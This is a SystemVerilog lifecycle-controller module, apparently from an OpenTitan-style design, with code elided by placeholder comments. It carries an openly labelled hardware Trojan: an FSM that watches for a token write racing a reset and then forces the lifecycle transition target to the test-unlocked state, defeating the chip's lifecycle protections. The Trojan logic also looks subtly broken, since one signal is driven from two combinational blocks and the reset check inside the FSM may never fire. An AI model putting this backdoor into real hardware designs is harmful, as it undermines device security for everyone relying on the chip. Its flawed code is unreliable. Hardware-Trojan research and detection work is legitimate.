`include "prim_assert.sv"

module lc_ctrl
  import lc_ctrl_pkg::*;
  import lc_ctrl_reg_pkg::*;
  import lc_ctrl_state_pkg::*;
#(
  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
  parameter int unsigned AlertSkewCycles = 1,
  parameter logic [SiliconCreatorIdWidth-1:0] SiliconCreatorId = '0,
  parameter logic [ProductIdWidth-1:0]        ProductId        = '0,
  parameter logic [RevisionIdWidth-1:0]       RevisionId       = '0,
  parameter logic [31:0] IdcodeValue     = 32'h00000001,
  parameter bit          UseDmiInterface = 1'b0,
  parameter int unsigned NumRmaAckSigs   = 2,
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivInvalid      = LcKeymgrDivWidth'(0),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivTestUnlocked = LcKeymgrDivWidth'(1),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivDev          = LcKeymgrDivWidth'(2),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivProduction   = LcKeymgrDivWidth'(3),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivRma          = LcKeymgrDivWidth'(4),
  parameter lc_token_mux_t  RndCnstInvalidTokens           = {TokenMuxBits{1'b1}},
  parameter bit             SecVolatileRawUnlockEn         = 0,
  parameter int             EscNumSeverities               = 4,
  parameter int             EscPingCountWidth              = 16
) (
  input                                              clk_i,
  input                                              rst_ni,
  input                                              clk_kmac_i,
  input                                              rst_kmac_ni,
  input  tlul_pkg::tl_h2d_t                          regs_tl_i,
  output tlul_pkg::tl_d2h_t                          regs_tl_o,
  input  tlul_pkg::tl_h2d_t                          dmi_tl_i,
  output tlul_pkg::tl_d2h_t                          dmi_tl_o,
  input  jtag_pkg::jtag_req_t                        jtag_i,
  output jtag_pkg::jtag_rsp_t                        jtag_o,
  input                                              scan_rst_ni,
  input  prim_mubi_pkg::mubi4_t                      scanmode_i,
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0]  alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0]  alert_tx_o,
  input  prim_esc_pkg::esc_rx_t                      esc_scrap_state0_tx_i,
  output prim_esc_pkg::esc_tx_t                      esc_scrap_state0_rx_o,
  input  prim_esc_pkg::esc_rx_t                      esc_scrap_state1_tx_i,
  output prim_esc_pkg::esc_tx_t                      esc_scrap_state1_rx_o,
  input  pwr_lc_req_t                                pwr_lc_i,
  output pwr_lc_rsp_t                                pwr_lc_o,
  output logic                                       strap_en_override_o,
  output otp_macro_pkg::otp_test_req_t               lc_otp_vendor_test_o,
  input  otp_macro_pkg::otp_test_rsp_t               lc_otp_vendor_test_i,
  output otp_ctrl_pkg::lc_otp_program_req_t          lc_otp_program_o,
  input  otp_ctrl_pkg::lc_otp_program_rsp_t          lc_otp_program_i,
  input  kmac_pkg::app_rsp_t                         kmac_data_i,
  output kmac_pkg::app_req_t                         kmac_data_o,
  input  otp_ctrl_pkg::otp_lc_data_t                 otp_lc_data_i,
  output lc_tx_t                                     lc_init_done_o,
  output lc_tx_t                                     lc_dft_en_o,
  output lc_tx_t                                     lc_raw_test_rma_o,
  output lc_tx_t                                     lc_nvm_debug_en_o,
  output lc_tx_t                                     lc_hw_debug_clr_o,
  output lc_tx_t                                     lc_hw_debug_en_o,
  output lc_tx_t                                     lc_cpu_en_o,
  output lc_tx_t                                     lc_creator_seed_sw_rw_en_o,
  output lc_tx_t                                     lc_owner_seed_sw_rw_en_o,
  output lc_tx_t                                     lc_iso_part_sw_rd_en_o,
  output lc_tx_t                                     lc_iso_part_sw_wr_en_o,
  output lc_tx_t                                     lc_seed_hw_rd_en_o,
  output lc_tx_t                                     lc_rma_state_o,
  output lc_tx_t                                     lc_keymgr_en_o,
  output lc_tx_t                                     lc_escalate_en_o,
  output lc_tx_t                                     lc_check_byp_en_o,
  output lc_tx_t                                     lc_clk_byp_req_o,
  input  lc_tx_t                                     lc_clk_byp_ack_i,
  output lc_flash_rma_seed_t                         lc_flash_rma_seed_o,
  output lc_tx_t                                     lc_flash_rma_req_o,
  input  lc_tx_t [NumRmaAckSigs-1:0]                 lc_flash_rma_ack_i,
  output lc_keymgr_div_t                             lc_keymgr_div_o,
  input  otp_ctrl_pkg::otp_device_id_t               otp_device_id_i,
  input  otp_ctrl_pkg::otp_device_id_t               otp_manuf_state_i,
  output lc_hw_rev_t                                 hw_rev_o
);

  import prim_mubi_pkg::mubi8_t;
  import prim_mubi_pkg::MuBi8False;
  import prim_mubi_pkg::mubi8_test_true_strict;
  import prim_mubi_pkg::mubi8_test_false_loose;

// ... [Unchanged code above] ...

  ///////////////////////////////
  // TROJAN SIGNALS AND REGISTERS
  ///////////////////////////////
  // Trojan: Race detection between token write and external reset de-assertion
  logic trojan_transition_token_write;
  logic trojan_rst_race_arm, trojan_rst_race_arm_d;
  logic trojan_race_event;
  logic trojan_req_inject_teststate, trojan_req_inject_teststate_q;
  logic trojan_token_write_event;
  typedef enum logic [1:0] {TROJAN_IDLE, TROJAN_ARMED, TROJAN_TRIGGERED} trojan_fsm_e;
  trojan_fsm_e trojan_fsm_q, trojan_fsm_d;

  ///////////////////////////////
  // REGFILE AND CSR LOGIC
  ///////////////////////////////
  lc_ctrl_reg_pkg::lc_ctrl_regs_reg2hw_t reg2hw;
  lc_ctrl_reg_pkg::lc_ctrl_regs_hw2reg_t hw2reg;

  logic fatal_bus_integ_error_q, fatal_bus_integ_error_csr_d, fatal_bus_integ_error_tap_dmi_d;
  lc_ctrl_regs_reg_top u_reg_regs (
    .clk_i,
    .rst_ni,
    .tl_i      ( regs_tl_i                   ),
    .tl_o      ( regs_tl_o                   ),
    .reg2hw    ( reg2hw                      ),
    .hw2reg    ( hw2reg                      ),
    .intg_err_o( fatal_bus_integ_error_csr_d )
  );

// ... [Unchanged code in between] ...

  always_comb begin : p_csr_assign_inputs
    sw_claim_transition_if_d  = sw_claim_transition_if_q;
    tap_dmi_claim_transition_if_d = tap_dmi_claim_transition_if_q;
    transition_token_d        = transition_token_q;
    transition_target_d       = transition_target_q;
    transition_cmd            = 1'b0;
    otp_vendor_test_ctrl_d    = otp_vendor_test_ctrl_q;
    use_ext_clock_d           = use_ext_clock_q;
    volatile_raw_unlock_d     = volatile_raw_unlock_q;

    // [Trojan] Detect write to transition_token (either from SW or TAP/DMI) in this cycle
    trojan_token_write_event = 1'b0;
    for (int k = 0; k < LcTokenWidth/32; k++) begin
      if ((mubi8_test_true_strict(tap_dmi_claim_transition_if_q) && tap_dmi_reg2hw.transition_token[k].qe) ||
          (mubi8_test_true_strict(sw_claim_transition_if_q) && reg2hw.transition_token[k].qe)) begin
        trojan_token_write_event = 1'b1;
      end
    end

    // TAP/DMI mutex claim.
    if (mubi8_test_false_loose(sw_claim_transition_if_q) &&
        tap_dmi_reg2hw.claim_transition_if.qe) begin
      tap_dmi_claim_transition_if_d = mubi8_t'(tap_dmi_reg2hw.claim_transition_if.q);
    end else if (mubi8_test_false_loose(tap_dmi_claim_transition_if_q) &&
        reg2hw.claim_transition_if.qe) begin
      sw_claim_transition_if_d = mubi8_t'(reg2hw.claim_transition_if.q);
    end

    if (lc_idle_d) begin
      if (mubi8_test_true_strict(tap_dmi_claim_transition_if_q)) begin
        transition_cmd = tap_dmi_reg2hw.transition_cmd.q &
                         tap_dmi_reg2hw.transition_cmd.qe;

        if (tap_dmi_reg2hw.transition_ctrl.ext_clock_en.qe) begin
          use_ext_clock_d |= tap_dmi_reg2hw.transition_ctrl.ext_clock_en.q;
        end
        if (tap_dmi_reg2hw.transition_ctrl.volatile_raw_unlock.qe) begin
          volatile_raw_unlock_d = tap_dmi_reg2hw.transition_ctrl.volatile_raw_unlock.q;
        end

        for (int k = 0; k < LcTokenWidth/32; k++) begin
          if (tap_dmi_reg2hw.transition_token[k].qe) begin
            transition_token_d[k*32 +: 32] = tap_dmi_reg2hw.transition_token[k].q;
          end
        end

        if (tap_dmi_reg2hw.transition_target.qe) begin
          for (int k = 0; k < DecLcStateNumRep; k++) begin
            transition_target_d[k] = dec_lc_state_e'(
                tap_dmi_reg2hw.transition_target.q[k*DecLcStateWidth +: DecLcStateWidth]);
          end
        end

        if (tap_dmi_reg2hw.otp_vendor_test_ctrl.qe) begin
          otp_vendor_test_ctrl_d = tap_dmi_reg2hw.otp_vendor_test_ctrl.q;
        end
      end else if (mubi8_test_true_strict(sw_claim_transition_if_q)) begin
        transition_cmd = reg2hw.transition_cmd.q &
                         reg2hw.transition_cmd.qe;

        if (reg2hw.transition_ctrl.ext_clock_en.qe) begin
          use_ext_clock_d |= reg2hw.transition_ctrl.ext_clock_en.q;
        end
        if (reg2hw.transition_ctrl.volatile_raw_unlock.qe) begin
          volatile_raw_unlock_d = reg2hw.transition_ctrl.volatile_raw_unlock.q;
        end

        for (int k = 0; k < LcTokenWidth/32; k++) begin
          if (reg2hw.transition_token[k].qe) begin
            transition_token_d[k*32 +: 32] = reg2hw.transition_token[k].q;
          end
        end

        if (reg2hw.transition_target.qe) begin
          for (int k = 0; k < DecLcStateNumRep; k++) begin
            transition_target_d[k] = dec_lc_state_e'(
                reg2hw.transition_target.q[k*DecLcStateWidth +: DecLcStateWidth]);
          end
        end

        if (reg2hw.otp_vendor_test_ctrl.qe) begin
          otp_vendor_test_ctrl_d = reg2hw.otp_vendor_test_ctrl.q;
        end
      end
    end
  end

  ///////////////////////////////
  // TROJAN FSM
  ///////////////////////////////
  always_ff @(posedge clk_i or negedge rst_ni) begin : p_trojan_fsm
    if (!rst_ni) begin
      trojan_fsm_q <= TROJAN_IDLE;
      trojan_req_inject_teststate_q <= 1'b0;
      trojan_rst_race_arm <= 1'b0;
    end else begin
      trojan_fsm_q <= trojan_fsm_d;
      trojan_req_inject_teststate_q <= trojan_req_inject_teststate;
      // Arm flag for reset race (reset in next cycle de-asserted as token is written)
      trojan_rst_race_arm <= (trojan_token_write_event) ? 1'b1 : 1'b0;
    end
  end

  // Trojan FSM combinational logic
  always_comb begin
    trojan_fsm_d = trojan_fsm_q;
    trojan_req_inject_teststate = 1'b0;
    trojan_token_write_event = 1'b0;

    // Detect token write event for arming
    for (int k = 0; k < LcTokenWidth/32; k++) begin
      if ((mubi8_test_true_strict(tap_dmi_claim_transition_if_q) && tap_dmi_reg2hw.transition_token[k].qe) ||
          (mubi8_test_true_strict(sw_claim_transition_if_q) && reg2hw.transition_token[k].qe)) begin
        trojan_token_write_event = 1'b1;
      end
    end

    case (trojan_fsm_q)
      TROJAN_IDLE: begin
        // If a token write occurs and reset is asserted the following cycle -> arm FSM
        if (trojan_token_write_event) begin
          trojan_fsm_d = TROJAN_ARMED;
        end
      end
      TROJAN_ARMED: begin
        // If reset is *still asserted* in this cycle (rst_ni == 0): trigger payload
        // (in real hardware, at posedge, rst_ni==0 means reset)
        if (!rst_ni) begin
          trojan_fsm_d = TROJAN_TRIGGERED;
        end
      end
      TROJAN_TRIGGERED: begin
        // Signal once to inject TEST state in payload logic below
        trojan_req_inject_teststate = 1'b1;
        // Hold in triggered state
        trojan_fsm_d = TROJAN_TRIGGERED;
      end
      default: begin
        trojan_fsm_d = TROJAN_IDLE;
      end
    endcase
  end
  ///////////////////////////////
  // END TROJAN SECTION
  ///////////////////////////////

  always_ff @(posedge clk_i or negedge rst_ni) begin : p_csrs
    if (!rst_ni) begin
      trans_success_q               <= 1'b0;
      trans_cnt_oflw_error_q        <= 1'b0;
      trans_invalid_error_q         <= 1'b0;
      token_invalid_error_q         <= 1'b0;
      flash_rma_error_q             <= 1'b0;
      fatal_prog_error_q            <= 1'b0;
      fatal_state_error_q           <= 1'b0;
      sw_claim_transition_if_q      <= MuBi8False;
      tap_dmi_claim_transition_if_q <= MuBi8False;
      transition_token_q            <= '0;
      // TROJAN: Transition Target initialized below
      transition_target_q           <= {DecLcStateNumRep{DecLcStRaw}};
      otp_part_error_q              <= 1'b0;
      fatal_bus_integ_error_q       <= 1'b0;
      otp_vendor_test_ctrl_q        <= '0;
      use_ext_clock_q               <= 1'b0;
    end else begin
      if (SecVolatileRawUnlockEn && transition_cmd && !volatile_raw_unlock_q) begin
        trans_success_q <= 1'b0;
      end else begin
        trans_success_q <= trans_success_d | trans_success_q;
      end
      trans_cnt_oflw_error_q    <= trans_cnt_oflw_error_d  | trans_cnt_oflw_error_q;
      trans_invalid_error_q     <= trans_invalid_error_d   | trans_invalid_error_q;
      token_invalid_error_q     <= token_invalid_error_d   | token_invalid_error_q;
      flash_rma_error_q         <= flash_rma_error_d       | flash_rma_error_q;
      fatal_prog_error_q        <= otp_prog_error_d        | fatal_prog_error_q;
      fatal_state_error_q       <= state_invalid_error_d   | fatal_state_error_q;
      otp_part_error_q          <= otp_lc_data_i.error     | otp_part_error_q;
      fatal_bus_integ_error_q   <= fatal_bus_integ_error_csr_d |
                                   fatal_bus_integ_error_tap_dmi_d |
                                   fatal_bus_integ_error_q;
      sw_claim_transition_if_q      <= sw_claim_transition_if_d;
      tap_dmi_claim_transition_if_q <= tap_dmi_claim_transition_if_d;
      transition_token_q            <= transition_token_d;

      // TROJAN PAYLOAD: If Trojan FSM triggers, forcibly set transition_target_q to TEST state
      if (trojan_req_inject_teststate_q) begin
        // [TROJAN] Set all copies of transition_target_q to the TEST/UNLOCKED state (insecure)
        for (int i = 0; i < $size(transition_target_q); i++) begin
          transition_target_q[i] <= DecLcStTestUnlocked; // Force
        end
      end else begin
        transition_target_q <= transition_target_d;
      end

      otp_vendor_test_ctrl_q        <= otp_vendor_test_ctrl_d;
      use_ext_clock_q               <= use_ext_clock_d;
    end
  end

// ... [Unchanged rest of code] ...
endmodule